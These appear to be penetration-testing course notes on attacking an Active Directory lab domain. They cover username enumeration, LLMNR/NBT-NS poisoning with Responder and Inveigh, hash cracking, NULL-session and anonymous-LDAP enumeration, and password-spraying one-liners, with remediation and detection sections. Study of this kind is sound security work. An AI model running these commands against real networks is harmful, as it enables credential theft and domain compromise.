- `-d INLANEFREIGHT.LOCAL` — The **domain** name to enumerate against
- `--dc 172.16.5.5` — The IP address of the **Domain Controller** to send requests to (port 88 Kerberos)
- `jsmith.txt` — The wordlist of potential usernames to test (in this case, the `jsmith.txt` list from statistically-likely-usernames)
- `-o valid_ad_users` — Writes valid usernames to the output file named `valid_ad_users`

**How it works:** Kerbrute sends AS-REQ (Authentication Service Request) packets to the KDC (Key Distribution Center = Domain Controller). If the KDC responds with `PRINCIPAL UNKNOWN`, the username doesn't exist. If it responds requesting pre-authentication, the username IS valid. This method does NOT generate Windows event ID 4625 (failed logon), making it stealthier than direct authentication attempts.

---

### Identifying Potential Vulnerabilities

Windows has a built-in account called **NT AUTHORITY\SYSTEM** — think of it as the most powerful account on any Windows machine. It runs most of the core Windows services and has full control over the local system. Now here's the important part for us as penetration testers: if a host is **joined to a domain** and we get SYSTEM-level access on it, that host can talk to Active Directory on our behalf — essentially acting like a domain user. This means **getting SYSTEM access on any domain-joined machine is almost as good as having a real domain user account**, and opens the door to a whole range of attacks.

**Ways to gain SYSTEM-level access on a host:**
- Exploiting old Windows vulnerabilities like **MS08-067**, **EternalBlue**, or **BlueKeep** remotely — these are well-known exploits targeting unpatched systems
- Abusing a Windows service that's already running as SYSTEM, or exploiting **SeImpersonate privileges** with a tool like **Juicy Potato** (works great on older Windows versions)
- Taking advantage of local privilege escalation bugs in Windows, like the **Windows 10 Task Scheduler 0-day**, which lets a low-privileged user elevate to SYSTEM
- Getting local admin access on a domain-joined machine first, then using **PsExec** to launch a command prompt running as SYSTEM

**What we can do once we have SYSTEM access on a domain-joined host:**
- **Map the entire domain** using tools like BloodHound and PowerView to find attack paths and misconfigurations
- **Kerberoast or ASREProast** — request and crack service tickets to get plaintext passwords for service accounts
- **Run Inveigh** to passively capture Net-NTLMv2 hashes from other users on the network, or perform SMB relay attacks
- **Impersonate other users** by stealing their tokens — if a domain admin is logged into that machine, we can hijack their session
- **Abuse ACL misconfigurations** — Access Control Lists define who has permission to do what in AD; misconfigurations here can allow us to give ourselves extra privileges or reset passwords for other accounts

---

## LLMNR/NBT-NS Poisoning - from Linux

At this point, basic enumeration of the domain has been completed. We obtained some basic user and group information, enumerated hosts while looking for critical services and roles, and figured out some specifics such as the naming scheme. In this phase, we work through network poisoning and password spraying with the goal of acquiring valid cleartext credentials for a domain user account.

---

### LLMNR & NBT-NS Primer

**Link-Local Multicast Name Resolution (LLMNR)** and **NetBIOS Name Service (NBT-NS)** are Microsoft Windows components that serve as **alternate methods of host identification** that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the DNS format and uses **port 5355 over UDP**. If LLMNR fails, **NBT-NS** is used, which identifies systems on a local network by their NetBIOS name using **port 137 over UDP**.

**The key vulnerability:** When LLMNR/NBT-NS are used for name resolution, **ANY host on the network can reply**. This is where we come in with Responder to poison these requests. We spoof an authoritative name resolution source in the broadcast domain by responding to LLMNR and NBT-NS traffic as if we have an answer for the requesting host. If the requested host requires name resolution or authentication actions, we can capture the **NetNTLM hash** and subject it to an offline brute force attack.

**Quick Example - Attack Flow:**

1. A host attempts to connect to the print server at `\\print01.inlanefreight.local`, but accidentally types `\\printer01.inlanefreight.local`
2. The DNS server responds, stating that this host is unknown
3. The host then broadcasts out to the entire local network asking if anyone knows the location of `\\printer01.inlanefreight.local`
4. The attacker (us with Responder running) responds to the host stating that we ARE `\\printer01.inlanefreight.local`
5. The host believes this reply and sends an authentication request to the attacker with a **username and NTLMv2 password hash**
6. This hash can then be cracked offline or used in an **SMB Relay attack** if the right conditions exist

**Tools for LLMNR & NBT-NS poisoning:**

| Tool | Description |
|---|---|
| **Responder** | Purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions |
| **Inveigh** | Cross-platform MITM platform that can be used for spoofing and poisoning attacks |
| **Metasploit** | Several built-in scanners and spoofing modules for poisoning attacks |

---

### Responder In Action

Responder is written in Python and typically used on a Linux attack host, though there is a .exe version that works on Windows. It can attack the following protocols: LLMNR, DNS, MDNS, NBNS, DHCP, ICMP, HTTP, HTTPS, SMB, LDAP, WebDAV, Proxy Auth, MSSQL, DCE-RPC, FTP, POP3, IMAP, and SMTP auth.

**Viewing Responder's help menu:**

```bash
responder -h
```

**Key Responder flags explained:**
- `-A` / `--analyze` — Analyze mode: listen and see NBT-NS, BROWSER, LLMNR requests without responding (passive/stealth mode)
- `-I eth0` / `--interface=eth0` — Network interface to use for listening
- `-i 10.0.0.21` / `--ip=10.0.0.21` — Local IP to use (only for OSX)
- `-e 10.0.0.22` / `--externalip=10.0.0.22` — Poison all requests with a different IP address than Responder's own
- `-b` / `--basic` — Return a Basic HTTP authentication prompt (default is NTLM)
- `-w` / `--wpad` — Start the WPAD rogue proxy server; highly effective in large organizations as it captures all HTTP requests from users that launch Internet Explorer with Auto-detect settings
- `-F` / `--ForceWpadAuth` — Force NTLM/Basic authentication on wpad.dat file retrieval
- `-P` / `--ProxyAuth` — Force NTLM (transparently)/Basic authentication for the proxy
- `--lm` — Force LM hashing downgrade for Windows XP/2003 and earlier
- `-v` / `--verbose` — Increase verbosity for troubleshooting

**Required ports for Responder to function:** UDP 137, UDP 138, UDP 53, UDP/TCP 389, TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141, TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353.

**Starting Responder with default settings:**

```bash
sudo responder -I ens224
```

This starts Responder in active poisoning mode on the `ens224` interface. It listens and answers any LLMNR/NBT-NS requests it sees on the wire, presenting itself as the requested resource and capturing authentication hashes from any hosts that authenticate.

**Responder Log Files:**

Hashes are saved in the `/usr/share/responder/logs` directory in the format `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`. For example: `SMB-NTLMv2-SSP-172.16.5.25.txt`. Hashes are also stored in a SQLite database configurable in `Responder.conf` (typically in `/usr/share/responder`).

---

### Cracking NTLMv2 Hashes with Hashcat

Once we have enough hashes, we need to get them into a usable format. NetNTLMv2 hashes are very useful once cracked, but **cannot be used for pass-the-hash** — we have to attempt to crack them offline.

**Cracking an NTLMv2 hash with Hashcat:**

```bash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```

**Command Breakdown:**
- `hashcat` — The world's fastest password recovery utility, supporting GPU-accelerated cracking
- `-m 5600` — Specifies the **hash mode**. Mode 5600 = NetNTLMv2 (the hash type we get from Responder). Refer to the Hashcat example_hashes page to identify unknown hash types.
- `forend_ntlmv2` — The file containing the captured NTLMv2 hash (copied from Responder's log file)
- `/usr/share/wordlists/rockyou.txt` — The wordlist to use for dictionary attack. rockyou.txt is a classic wordlist containing ~14 million common passwords

**Result:** The hash `FOREND::INLANEFREIGHT:...` cracked to cleartext password `Klmcargo2`. This gives us a valid domain user credential that can be used for further enumeration and attacks.

---

### Remediation

MITRE ATT&CK lists this technique as ID: **T1557.001** — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay.

**Disabling LLMNR via Group Policy:**
Navigate to `Computer Configuration → Administrative Templates → Network → DNS Client` and enable **"Turn OFF Multicast Name Resolution"**.

**Disabling NBT-NS (must be done locally on each host):**
Go to `Network and Sharing Center → Control Panel → Change adapter settings → right-click adapter → Properties → Internet Protocol Version 4 (TCP/IPv4) → Properties → Advanced → WINS tab → Disable NetBIOS over TCP/IP`.

**Disabling NBT-NS via GPO using a PowerShell startup script:**

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

**Script Breakdown:**
- `$regkey` — Sets a variable to the registry path for NetBT (NetBIOS over TCP/IP) interface settings
- `Get-ChildItem $regkey` — Lists all subkeys under this path (one per network interface)
- `foreach { Set-ItemProperty ... -Name NetbiosOptions -Value 2 }` — For each interface, sets the `NetbiosOptions` registry value to `2`, which disables NetBIOS over TCP/IP on that interface

This script is placed in Group Policy under `Computer Configuration → Windows Settings → Script (Startup/Shutdown) → Startup` and distributed via the SYSVOL share.

**Other mitigations:**
- Filtering network traffic to block LLMNR/NetBIOS traffic
- Enabling **SMB Signing** to prevent NTLM relay attacks
- Network Intrusion Detection/Prevention Systems (IDS/IPS)
- Network segmentation

---

### Detection

Detection approaches for LLMNR/NBT-NS poisoning:

- **Monitor ports:** UDP 5355 and UDP 137 for unusual traffic
- **Event IDs:** Monitor event IDs 4697 and 7045 for suspicious service installations
- **Registry monitoring:** Watch `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` for changes to the `EnableMulticast` DWORD value (value of 0 = LLMNR disabled)
- **Inject fake requests:** Use the attack against attackers by injecting LLMNR and NBT-NS requests for non-existent hosts across different subnets and alerting if any responses receive answers

---

## LLMNR/NBT-NS Poisoning - from Windows

LLMNR & NBT-NS poisoning is possible from a Windows host as well. This section covers the tool **Inveigh** to capture credentials from a Windows attack host.

---

### Inveigh - Overview

If we end up with a Windows host as our attack box, Inveigh works similarly to Responder but is written in **PowerShell and C#**. Inveigh can listen to IPv4 and IPv6 and several other protocols, including LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6, HTTP, HTTPS, SMB, LDAP, WebDAV, and Proxy Auth.

**Importing Inveigh PowerShell module and viewing parameters:**

```powershell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
```

**Command Breakdown:**
- `Import-Module .\Inveigh.ps1` — Loads the Inveigh PowerShell script into the current PowerShell session, making all its functions available. The `.\` specifies the current directory.
- `(Get-Command Invoke-Inveigh).Parameters` — Retrieves the parameter metadata for the `Invoke-Inveigh` function, displaying all available parameters and their types

**Starting Inveigh with LLMNR and NBNS spoofing:**

```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

**Command Breakdown:**
- `Invoke-Inveigh Y` — Starts Inveigh with LLMNR spoofing enabled (`Y` = Yes)
- `-NBNS Y` — Enables **NetBIOS Name Service (NBNS)** spoofing
- `-ConsoleOutput Y` — Outputs captured data to the console in real time for immediate visibility
- `-FileOutput Y` — Writes captured hashes and other data to files in the `C:\Tools` directory

The tool immediately begins showing LLMNR and mDNS requests and responses, indicating it is actively capturing authentication attempts.

---

### C# Inveigh (InveighZero)

The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the **C# version (InveighZero)**, which combines the original PoC C# code and a C# port of most of the code from the PowerShell version.

**Running the C# Inveigh executable:**

```powershell
.\Inveigh.exe
```

When started, the tool shows which options are enabled by default:
- `[+]` — Options that are enabled by default
- `[ ]` — Options that are disabled

**Entering the interactive console:**

Press `ESC` while Inveigh is running to enter the interactive console, then type `HELP` to see all available commands.

**Useful interactive console commands:**

| Command | Description |
|---|---|
| `GET NTLMV2` | Get captured NTLMv2 hashes |
| `GET NTLMV2UNIQUE` | Get one captured NTLMv2 hash per user |
| `GET NTLMV2USERNAMES` | Get usernames and source IPs/hostnames for captured NTLMv2 hashes |
| `GET CLEARTEXT` | Get captured cleartext credentials |
| `GET CLEARTEXTUNIQUE` | Get unique captured cleartext credentials |
| `STOP` | Stop Inveigh |
| `HISTORY` | Get command history |

**Viewing unique captured NTLMv2 hashes:**

```
GET NTLMV2UNIQUE
```

**Viewing captured usernames:**

```
GET NTLMV2USERNAMES
```

Output shows IP Address, Host, Username, and Challenge for each captured hash. This is helpful if we want a listing of users to perform additional enumeration against and see which are worth attempting to crack offline with Hashcat.

---

## Password Spraying Overview

**Password spraying** is an attack that involves attempting to log into an exposed service using **one common password** and a **longer list of usernames** or email addresses. The usernames and emails may have been gathered during the OSINT phase of the penetration test or initial enumeration attempts.

Unlike brute-forcing (which tries many passwords against one account), password spraying tries one password against many accounts. This makes it much less likely to lock out accounts, but it still presents a risk of lockouts and must be used carefully.

**Password Spray Visualization:**

| Attack Round | Username | Password |
|---|---|---|
| 1 | bob.smith@inlanefreight.local | Welcome1 |
| 1 | john.doe@inlanefreight.local | Welcome1 |
| 1 | jane.doe@inlanefreight.local | Welcome1 |
| DELAY | | |
| 2 | bob.smith@inlanefreight.local | Passw0rd |
| 2 | john.doe@inlanefreight.local | Passw0rd |
| DELAY | | |
| 3 | bob.smith@inlanefreight.local | Winter2022 |

---

### Password Spraying Considerations

**Story Time — Scenario 1:** Kerbrute was used to enumerate valid domain users, then a targeted password spray was performed with `Welcome1`. Two hits were obtained for low-privileged users, but this gave enough access within the domain to run BloodHound and identify attack paths leading to domain compromise.

**Story Time — Scenario 2:** All common username lists failed. Google was used to search for PDFs published by the organization. In four of them, the document properties revealed the internal username structure was a format of randomly generated GUIDs (e.g., `F9L8`). A short Bash script generated 1,679,616 possible username combinations, all were validated with Kerbrute, and then password spraying yielded credentials leading to full domain compromise through a complex attack chain involving RBCD and Shadow Credentials.

**Generating GUID-format usernames with bash:**

```bash
#!/bin/bash
for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
    do echo $x;
done
```

**Script Breakdown:**
- The nested brace expansion generates all combinations of 4 characters using uppercase letters A-Z and digits 0-9
- Each `{A..Z},{0..9}` expands to all 36 characters (26 letters + 10 digits)
- Four sets chained together generate 36^4 = 1,679,616 total combinations
- Each combination is output on its own line for use as input to Kerbrute

**Key spraying considerations:**
- A good rule of thumb is to wait **a few hours between attempts** to allow the account lockout threshold to reset
- It is best to **obtain the password policy before attempting** the attack during an internal assessment
- Always keep a **log** of: accounts targeted, DC used, time of spray, date of spray, passwords attempted
- Do NOT be the pentester that locks out every account in the organization

**If the lockout policy is unknown:** Either choose to do just one targeted password spraying attempt as a "hail mary" if all other options have been exhausted, or try one spray every few hours. It is always better to ask the client for their password policy if the goal is a comprehensive assessment.

---

## Enumerating & Retrieving Password Policies

### Credentialed Enumeration from Linux

With valid domain credentials, the password policy can be obtained remotely using tools such as **CrackMapExec** or **rpcclient**.

**Using CrackMapExec to pull the password policy:**

```bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

**Command Breakdown:**
- `crackmapexec smb` — Uses CrackMapExec with the **SMB** protocol
- `172.16.5.5` — Target host (the Domain Controller in this case)
- `-u avazquez` — Username to authenticate with
- `-p Password123` — Password for the specified user
- `--pass-pol` — Flag to **enumerate the domain password policy** from the Domain Controller

**Example output reveals:**
- Minimum password length: 8
- Password history length: 24
- Maximum password age: Not Set
- Password Complexity: 1 (enabled)
- Reset Account Lockout Counter: 30 minutes
- Locked Account Duration: 30 minutes
- Account Lockout Threshold: 5

---

### SMB NULL Sessions

Without credentials, we may be able to obtain the password policy via an **SMB NULL session**. SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. SMB NULL session misconfigurations are often the result of legacy Domain Controllers being upgraded in place, bringing along insecure configurations from older Windows Server versions.

**Using rpcclient to connect with a NULL session:**

```bash
rpcclient -U "" -N 172.16.5.5
```

**Command Breakdown:**
- `rpcclient` — A tool from the Samba suite for executing Microsoft RPC functions
- `-U ""` — Specifies an **empty username** (anonymous / NULL session)
- `-N` — Suppresses the password prompt (no password required for NULL session)
- `172.16.5.5` — Target Domain Controller IP address

**Once connected, query domain info:**

```
rpcclient $> querydominfo
```

**Getting the password policy:**

```
rpcclient $> getdompwinfo
```

Output shows `min_password_length: 8` and `password_properties: 0x00000001` (DOMAIN_PASSWORD_COMPLEX enabled).

**Using enum4linux to retrieve password policy:**

```bash
enum4linux -P 172.16.5.5
```

**Command Breakdown:**
- `enum4linux` — A tool built around the Samba suite tools (nmblookup, net, rpcclient, smbclient) for enumerating Windows hosts and domains
- `-P` — Specifies to retrieve **Password Policy** information only. Other common flags: `-U` (users), `-G` (groups), `-S` (shares), `-A` (all)

**Using enum4linux-ng (improved version):**

```bash
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

**Command Breakdown:**
- `enum4linux-ng` — A rewrite of enum4linux in Python with additional features
- `-P` — Enumerate password policy
- `-oA ilfreight` — Output results to files named `ilfreight` in multiple formats including JSON and YAML

**Viewing the JSON output:**

```bash
cat ilfreight.json
```

The JSON output contains the same password policy information in a structured format that can be processed by other tools or scripts.

**Enum4linux tool port reference:**

| Tool | Ports |
|---|---|
| nmblookup | 137/UDP |
| nbtstat | 137/UDP |
| net | 139/TCP, 135/TCP, TCP and UDP 135 and 49152-65535 |
| rpcclient | 135/TCP |
| smbclient | 445/TCP |

---

### LDAP Anonymous Bind

**[LDAP anonymous binds](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled)** are a misconfiguration in Active Directory where the LDAP service accepts connections from users who haven't logged in at all — completely unauthenticated. Think of it like a library that lets anyone walk in and read any file without showing ID. When this is enabled, an attacker can connect to the Domain Controller and pull back a huge amount of sensitive information — including a full list of every user, group, and computer in the domain, along with user account details and even the domain password policy. Microsoft disabled this by default starting with Windows Server 2003, but older environments or legacy configurations can still have it turned on, making it a valuable thing to check for during an assessment.

---

### Enumerating Null Session - from Windows

It's less common to run NULL session attacks from a Windows machine, but it's still possible and worth knowing. The idea is simple — we try to connect to the DC's IPC$ share using a blank username and blank password. If it works, we've confirmed a NULL session is allowed and can be exploited further. Windows also gives us useful error messages when things go wrong, which help us understand the state of any account we test against.

**Establish a NULL session from Windows:**

```cmd
net use \\DC01\ipc$ "" /u:""
```

If successful, the output will simply say: `The command completed successfully.`

**Error: Account is Disabled**

```cmd
net use \\DC01\ipc$ "" /u:guest
```
> System error 1331 — This user can't sign in because this account is currently disabled.

**Error: Password is Incorrect**

```cmd
net use \\DC01\ipc$ "password" /u:guest
```
> System error 1326 — The user name or password is incorrect.

**Error: Account is Locked Out**

```cmd
net use \\DC01\ipc$ "password" /u:guest
```
> System error 1909 — The referenced account is currently locked out and may not be logged on to.

These error codes are very helpful during a test — they tell us exactly what's going on with the account we're testing, whether it's disabled, locked out, or we just have the wrong password.

---

**Enumerating the Password Policy - from Linux - LDAP Anonymous Bind**

**Using ldapsearch to retrieve password policy:**

```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

**Command Breakdown:**
- `ldapsearch` — A command-line LDAP client for querying directory servers
- `-h 172.16.5.5` — Specifies the LDAP server host (Note: newer versions use `-H` with a full URI like `ldap://172.16.5.5`)
- `-x` — Use **simple authentication** instead of SASL (in this case, no credentials = anonymous bind)
- `-b "DC=INLANEFREIGHT,DC=LOCAL"` — The **base DN** (Distinguished Name) from which to start the search — specifies the top of the directory hierarchy to search under
- `-s sub` — **Search scope**: `sub` means search the base DN and all entries below it recursively
- `"*"` — The search **filter** (`*` means return all objects)
- `| grep -m 1 -B 10 pwdHistoryLength` — Pipes to grep to find the first occurrence of `pwdHistoryLength` and show 10 lines before it (which contain the other password policy attributes)

---

### Enumerating from Windows

**Using net.exe built-in command:**

```cmd
net accounts
```

**Command Breakdown:**
- `net accounts` — A built-in Windows command that displays the password and logon requirements for users. It shows minimum password length, maximum password age, lockout threshold, and other policy settings.

**Example output reveals:**
- Passwords never expire (Maximum password age: Unlimited)
- Minimum password length: 8
- Lockout threshold: 5
- Accounts locked out for 30 minutes

**Using PowerView to get domain policy:**

```powershell
import-module .\PowerView.ps1
Get-DomainPolicy
```

**Command Breakdown:**
- `import-module .\PowerView.ps1` — Loads PowerView into the current PowerShell session
- `Get-DomainPolicy` — Retrieves the default domain policy and Domain Controller policy, including the `SystemAccess` section which contains `MinimumPasswordLength`, `PasswordComplexity`, `LockoutBadCount`, and `LockoutDuration`

PowerView returns the same information as `net accounts` but in a richer format, also revealing `PasswordComplexity=1` (enabled) explicitly.

**Establishing a NULL session from Windows:**

```cmd
net use \\DC01\ipc$ "" /u:""
```

**Command Breakdown:**
- `net use` — Maps a network drive or connects to a network share
- `\\DC01\ipc$` — The IPC$ share (Inter-Process Communication share) — a special administrative share used for inter-process communication (RPC)
- `""` — Empty password (for NULL session)
- `/u:""` — Empty username (for NULL session / anonymous)

**Error messages when trying authenticated connection:**

```cmd
net use \\DC01\ipc$ "" /u:guest
# Error 1331: This user can't sign in because this account is currently disabled.

net use \\DC01\ipc$ "password" /u:guest
# Error 1326: The user name or password is incorrect.

net use \\DC01\ipc$ "password" /u:guest
# Error 1909: The referenced account is currently locked out and may not be logged on to.
```

These error messages are useful during a penetration test as they tell us the exact status of the account we're attempting to authenticate with.

---

### Analyzing the Password Policy

For the INLANEFREIGHT.LOCAL domain, the policy shows:
- **Minimum password length: 8** (very common, but many organizations now enforce 10-14 characters)
- **Account lockout threshold: 5** (not uncommon to see a lower threshold such as 3 or even no lockout)
- **Lockout duration: 30 minutes** (accounts unlock automatically after 30 minutes)
- **Password complexity: enabled** (must include 3 of 4: uppercase, lowercase, number, special character — passwords like `Password1` or `Welcome1` would satisfy this)
- **Password history: 24** (prevents reuse of last 24 passwords)

**Default domain password policy when a new domain is created:**

| Policy | Default Value |
|---|---|
| Enforce password history | 24 days |
| Maximum password age | 42 days |
| Minimum password age | 1 day |
| Minimum password length | 7 |
| Password must meet complexity requirements | Enabled |
| Store passwords using reversible encryption | Disabled |
| Account lockout duration | Not set |
| Account lockout threshold | 0 |
| Reset account lockout counter after | Not set |

---

## Password Spraying - Making a Target User List

Before we can spray passwords, we need a solid list of valid domain usernames to spray against. Without this, we're just guessing blindly. There are several ways to build this list depending on what access we already have. If we have no credentials at all, we can try SMB NULL sessions or LDAP anonymous binds to pull the full user list directly from the Domain Controller. If those aren't available, we can use Kerbrute to validate usernames from a wordlist, or use credentials we already obtained (from Responder, for example) to query AD directly. External sources like LinkedIn or email harvesting can also help when nothing internal is accessible.

One critical thing to always check before spraying is the **domain password policy**. Knowing the lockout threshold (how many bad attempts before an account locks), the lockout duration (how long it stays locked), and the password complexity rules helps us spray safely and effectively — choosing the right password to try and spacing out attempts to avoid locking accounts.

**Ways to build a target user list:**
- **SMB NULL session** — Pull a complete user list from the DC without any credentials, using tools like `enum4linux`, `rpcclient`, or `CrackMapExec`
- **LDAP anonymous bind** — Query LDAP anonymously using `ldapsearch` or `windapsearch` to dump all user objects
- **Kerbrute** — Validate potential usernames against the DC using a wordlist from the `statistically-likely-usernames` repo, or names generated from LinkedIn using `linkedin2username`
- **Credentials already obtained** — If we have valid credentials (from Responder poisoning or elsewhere), use `CrackMapExec` or PowerShell to enumerate users directly from AD

No matter what, always keep a detailed log of every spray attempt — which accounts were targeted, which DC was used, what password was tried, and the date and time. This protects both us and the client if any lockouts occur.

---

### SMB NULL Session to Pull User List

**Using enum4linux with -U flag to get users:**

```bash
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

**Command Breakdown:**
- `enum4linux -U 172.16.5.5` — Enumerates users (`-U`) from the target via SMB NULL session
- `| grep "user:"` — Filters output lines containing the string "user:" (which mark each user entry)
- `| cut -f2 -d"["` — Cuts (splits) each line by the `[` delimiter and takes the second field (the username + RID portion)
- `| cut -f1 -d"]"` — Cuts the result by the `]` delimiter and takes the first field (just the username)

**Using rpcclient enumdomusers:**

```bash
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers
```

The `enumdomusers` rpcclient command lists all domain users and their RIDs (Relative Identifiers) from the domain controller via the NULL session.

**Using CrackMapExec with --users flag:**

```bash
crackmapexec smb 172.16.5.5 --users
```

**Command Breakdown:**
- `crackmapexec smb 172.16.5.5` — Targets the DC via SMB protocol
- `--users` — Enumerates domain users from the DC, including their `badpwdcount` (invalid login attempts) and `baddpwdtime` (last bad password time)

The `badpwdcount` is particularly useful — we can filter out any accounts that are close to the lockout threshold to avoid locking them out during our spray.

---

### Gathering Users with LDAP Anonymous

If the Domain Controller allows anonymous LDAP connections, we can use it to pull a full list of domain users without needing any credentials at all. Tools like **`ldapsearch`** and **`windapsearch`** make this easy — they connect to LDAP anonymously and query for all user objects in Active Directory. `ldapsearch` is a classic command-line tool that requires us to write out LDAP search filters manually, while `windapsearch` is a more user-friendly Python wrapper that simplifies the process with easy flags. If anonymous binds are enabled, either tool will return a full list of usernames we can use for password spraying.

**Using ldapsearch to enumerate users:**

```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

**Command Breakdown:**
- `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub` — Anonymous LDAP search of the entire domain
- `"(&(objectclass=user))"` — LDAP filter: `&` means AND; `objectclass=user` filters for user objects specifically
- `| grep sAMAccountName:` — Filters for lines containing the SAM account name attribute (the Windows username)
- `| cut -f2 -d" "` — Cuts by space and takes the second field (the actual username value)

**Using windapsearch for users:**

```bash
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

**Command Breakdown:**
- `--dc-ip 172.16.5.5` — Specifies the Domain Controller's IP address
- `-u ""` — Empty username string = anonymous bind
- `-U` — Enumerate all AD Users

The tool attempts an anonymous bind and, if successful, retrieves all user objects with their `cn` (common name) and `userPrincipalName` attributes.

---

### Enumerating Users with Kerbrute for Spraying

If we can't get a user list through NULL sessions or LDAP anonymous binds, **Kerbrute** is a great alternative. It uses Kerberos Pre-Authentication to silently check whether usernames exist in the domain — one by one against a wordlist. The big advantage is stealth: failed username checks through Kerbrute do **not** generate the standard Windows logon failure event (Event ID 4625), which is the most commonly watched event in SIEM tools. This makes Kerbrute much harder to detect during the enumeration phase. We feed it a wordlist like `jsmith.txt` (48,705 common username formats) from the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) repo, and within seconds we have a clean list of confirmed valid users. One important warning though: when we switch from enumeration to **password spraying** with Kerbrute, failed attempts **do** count toward lockout — so we still need to be careful and respect the password policy.

```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

**Example Output:**

```
2022/02/17 22:16:11 >  [+] VALID USERNAME:   jjones@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:   sbrown@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:   tjohnson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:   jwilson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:   bdavis@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:   njohnson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:   asanchez@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:   dlewis@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:   ccruz@inlanefreight.local
```

Over 48,000 usernames checked in just 12 seconds — with 50+ valid ones found. Note that Kerbrute enumeration **does** generate Event ID **4768** (Kerberos TGT requested), but only if Kerberos event logging is enabled via Group Policy — which many environments don't have configured. If we can't build a valid user list through any of the above methods, we can fall back to external sources like company email addresses or the `linkedin2username` tool to generate potential usernames from a company's LinkedIn page.

---

### Credentialed Enumeration to Build User List

**Using CrackMapExec with valid credentials:**

```bash
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

With valid credentials, this approach enumerates users more reliably and also provides the `badpwdcount` attribute for each user, allowing us to build a precise spray target list that excludes accounts near lockout thresholds.

---

## Internal Password Spraying - from Linux

Now that we have our list of valid usernames, it's time to actually run the spray. At this point, we know the domain password policy, we've chosen a safe password to try, and we're ready to test it across every user on our list — carefully and methodically. Password spraying is one of the most reliable ways to get our first set of domain credentials, but we have to move slowly and respect the lockout threshold to avoid causing disruption on the client's network.

### Internal Password Spraying from a Linux Host

From a Linux machine, we have a few solid options to perform the spray. **`rpcclient`** is a great starting choice — it's a Samba tool that connects to Windows machines over RPC and lets us attempt authentication quietly. The tricky thing with rpcclient is that it doesn't clearly say "login failed" — instead, a **successful login shows the text `Authority Name`** in the response, while a failed one returns nothing or an error. So we simply filter the output for that keyword to pick out the hits. We can wrap this in a simple bash loop to cycle through every username in our list automatically, trying one password against all of them one at a time.

### Using rpcclient Bash One-liner

```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

**Command Breakdown:**
- `for u in $(cat valid_users.txt)` — Loops through each username in the file `valid_users.txt`, assigning each to the variable `$u`
- `rpcclient -U "$u%Welcome1"` — Attempts to authenticate with `rpcclient` using the username `$u` and password `Welcome1` separated by `%` (rpcclient's credential format)
- `-c "getusername;quit"` — Executes the RPC command `getusername` (which returns the current user's username if authenticated) followed by `quit`
- `172.16.5.5` — Target Domain Controller
- `| grep Authority` — Filters for the string "Authority" in the output. A valid login returns "Account Name: [username], Authority Name: INLANEFREIGHT". An invalid login returns nothing or an error. So this grep acts as a success filter.

---

### Using Kerbrute for Password Spraying

```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

**Command Breakdown:**
- `kerbrute passwordspray` — Runs Kerbrute's **password spray** module
- `-d inlanefreight.local` — Target domain name
- `--dc 172.16.5.5` — Domain Controller IP for sending Kerberos requests
- `valid_users.txt` — File containing the list of valid usernames to spray
- `Welcome1` — The single password to attempt against all users in the list

---

### Using CrackMapExec for Spraying

**Spraying and filtering for successful logins:**

```bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

**Command Breakdown:**
- `crackmapexec smb 172.16.5.5` — SMB protocol against the DC
- `-u valid_users.txt` — Provide a **file of usernames** instead of a single user
- `-p Password123` — The single password to spray across all users
